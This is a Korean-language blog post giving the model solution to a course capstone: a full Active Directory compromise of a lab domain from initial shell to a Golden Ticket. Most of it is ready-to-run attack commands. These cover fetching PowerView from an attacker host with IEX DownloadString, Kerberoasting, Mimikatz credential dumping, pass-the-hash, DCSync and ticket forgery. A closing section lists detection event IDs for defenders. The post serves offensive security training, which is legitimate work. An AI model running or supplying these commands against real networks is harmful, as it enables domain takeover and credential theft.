---
layout: post
title: "Offensive AD & APT Mastery: Capstone Solution - Full Chain Attack Walkthrough"
---

Week 12 Capstone Project의 **모범 답안(Solution)**입니다.
막막하셨던 분들은 이 가이드를 따라 하나씩 실습해보세요.

**Scenario:**
*   **Target:** `corp.local` 도메인.
*   **Initial Access:** 피싱으로 `Manage-PC`의 로컬 사용자 `user`의 쉘 획득.
*   **Goal:** 도메인 컨트롤러(`DC01`)를 장악하고 `Golden Ticket` 생성.

---

## Phase 1: Reconnaissance (정찰)

가장 먼저 해야 할 일은 "내가 어디에 있는지" 아는 것입니다.

### 1.1 Local Recon
```powershell
# 현재 사용자 및 그룹 확인
whoami /all
# 네트워크 정보 확인 (DNS 서버가 DC일 확률 99%)
ipconfig /all
```

### 1.2 Domain Recon (PowerView)
AD 구조를 파악합니다.
```powershell
# PowerView 로드 (메모리 로딩 권장)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# 도메인 정보 확인
Get-NetDomain
# 도메인 컨트롤러 확인
Get-NetDomainController
# Domain Admins 그룹 멤버 확인 (타겟 식별)
Get-NetGroupMember "Domain Admins"
```

---

## Phase 2: Privilege Escalation (권한 상승)

로컬 `user`로는 할 수 있는 게 없습니다. 최소한 로컬 `Administrator`나 도메인 유저 권한이 필요합니다.

### 2.1 Kerberoasting (PrivEsc to Service Account)
SPN이 설정된 서비스 계정을 찾습니다.
```powershell
# Rubeus로 Kerberoasting (TGS-REQ 날리기)
.\Rubeus.exe kerberoast /outfile:hashes.txt
```
*   **Result:** `svc_sql` 계정의 해시를 획득.
*   **Crack:** `hashcat -m 13100 hashes.txt rockyou.txt` -> 비밀번호 `Password123!` 획득.

---

## Phase 3: Lateral Movement (횡적 이동)

`svc_sql` 계정은 도메인 유저입니다. 이제 더 넓은 세상을 볼 수 있습니다.

### 3.1 BloodHound Analysis
BloodHound를 돌려보니 `svc_sql` 계정이 `DB-Server`의 로컬 관리자 권한을 가지고 있습니다.
그리고 `DB-Server`에는 `Domain Admin`인 `Administrator`가 로그인해 있습니다(HasSession).

### 3.2 Jump to DB-Server
`svc_sql` 계정으로 `DB-Server`에 접속합니다.
```bash
# Kali에서 실행 (Impacket)
psexec.py corp.local/svc_sql:Password123!@192.168.56.20
```
*   **Result:** `DB-Server`의 `SYSTEM` 권한 쉘 획득.

---

## Phase 4: Credential Theft (계정 탈취)

`DB-Server`의 메모리(LSASS)를 털어서 `Administrator`의 흔적을 찾습니다.

### 4.1 Mimikatz Dump
```bash
# Mimikatz 업로드 및 실행
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
*   **Result:** `Administrator`의 NTLM 해시 (`32ed87bdb5fdc5e9cba88547376818d4`) 획득. (평문 비밀번호가 안 보여도 해시만 있으면 됩니다!)

---

## Phase 5: Domain Dominance (도메인 장악)

`Administrator`의 해시를 얻었으므로, 이제 DC로 갈 수 있습니다.

### 5.1 Pass-the-Hash to DC
```bash
# 해시를 이용해 DC에 접속
wmiexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 corp.local/Administrator@192.168.56.10
```
*   **Result:** `DC01`의 쉘 획득. **Game Over.**

### 5.2 DCSync (Extract krbtgt)
DC를 장악했으니, 모든 유저의 비밀번호를 덤프 뜹니다.
```bash
# DC 쉘에서 실행하거나, 원격에서 실행
secretsdump.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 corp.local/Administrator@192.168.56.10
```
*   **Target:** `krbtgt` 계정의 NTLM 해시와 SID를 복사해둡니다.

---

## Phase 6: Persistence (지속성 유지)

비밀번호가 바뀌어도 들어올 수 있게 `Golden Ticket`을 만듭니다.

### 6.1 Forge Golden Ticket
```bash
# Impacket ticketer.py 사용
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain corp.local -user FakeAdmin administrator
```
*   **Result:** `administrator.ccache` 파일 생성 (TGT).

### 6.2 Use Ticket
```bash
# 환경 변수에 티켓 등록
export KRB5CCNAME=administrator.ccache

# 비밀번호 없이 티켓으로 DC 접속 (Kerberos 인증)
psexec.py -k -no-pass corp.local/administrator@dc01.corp.local
```

---

## Phase 7: Blue Team Analysis (방어자 관점)

이 모든 과정은 로그를 남깁니다.

1.  **Recon:** `4661` (SAM 객체 접근), `4662` (디렉터리 서비스 접근). BloodHound는 엄청난 양의 LDAP 쿼리를 발생시킵니다.
2.  **Kerberoasting:** `4769` (Kerberos Service Ticket 요청). 암호화 방식이 `RC4 (0x17)`인 요청을 찾으세요.
3.  **Lateral Movement:** `4624` (로그온). `LogonType=3` (네트워크 로그온)이 발생합니다. PsExec는 `7045` (서비스 설치) 로그를 남깁니다.
4.  **DCSync:** `4662` 이벤트에서 `DS-Replication-Get-Changes` 권한(GUID `1131f6aa...`)에 접근한 기록을 찾으세요.

이 로그들을 SIEM(Splunk)에서 상관분석(Correlation)하면 공격 흐름을 재구성할 수 있습니다.
수고하셨습니다.
